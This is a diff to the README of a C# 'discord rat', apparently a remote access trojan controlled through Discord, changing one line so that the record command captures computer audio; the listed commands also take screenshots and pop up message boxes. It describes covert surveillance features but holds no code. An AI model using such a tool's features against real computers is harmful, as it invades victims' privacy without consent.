@@ -6,7 +6,7 @@ A simple discord rat. Made in c#.
 
 # Commands
 * !Commandlist shows this menu.
-* !Record(Sec) Record computer with given seconds.
+* !Record(Sec) Record computer audio with given seconds.
 * !Screenshot Take a screenshot.
 * !Msgbox(Text, Title) Make a msgbox.
 * !Mbss(Text, Title) Make a msgbox and screenshot.
